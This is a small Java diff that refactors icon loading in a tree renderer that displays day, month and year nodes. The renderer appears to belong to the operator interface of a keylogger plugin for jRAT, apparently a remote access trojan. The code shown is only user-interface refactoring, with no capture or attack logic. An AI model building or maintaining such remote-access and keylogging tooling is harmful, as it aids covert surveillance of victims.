@@ -1,7 +1,5 @@
 package se.jrat.plugin.keylogger.client.ui;
 
-import iconlib.IconUtils;
-
 import java.awt.Component;
 import java.awt.Font;
 import java.util.Date;
@@ -10,13 +8,15 @@ import javax.swing.Icon;
 import javax.swing.JTree;
 import javax.swing.tree.DefaultTreeCellRenderer;
 
+import jrat.api.Icons;
+
 @SuppressWarnings({ "serial", "deprecation" })
 public class TreeRenderer extends DefaultTreeCellRenderer {
 	
-	public static final Icon DAY_ICON = IconUtils.getIcon("day", TreeRenderer.class);
-	public static final Icon MONTH_ICON = IconUtils.getIcon("month", TreeRenderer.class);
-	public static final Icon YEAR_ICON = IconUtils.getIcon("year", TreeRenderer.class);
-	public static final Icon DEFAULT_ICON = IconUtils.getIcon("default", TreeRenderer.class);
+	public static final Icon DAY_ICON = Icons.getIcon("Keylogger", "day");
+	public static final Icon MONTH_ICON = Icons.getIcon("Keylogger", "month");
+	public static final Icon YEAR_ICON = Icons.getIcon("Keylogger", "year");
+	public static final Icon DEFAULT_ICON = Icons.getIcon("Keylogger", "default");
 
 	public Component getTreeCellRendererComponent(JTree tree, Object value, boolean sel, boolean expanded, boolean leaf, int row, boolean hasFocus) {
 		super.getTreeCellRendererComponent(tree, value, sel, expanded, leaf, row, hasFocus);
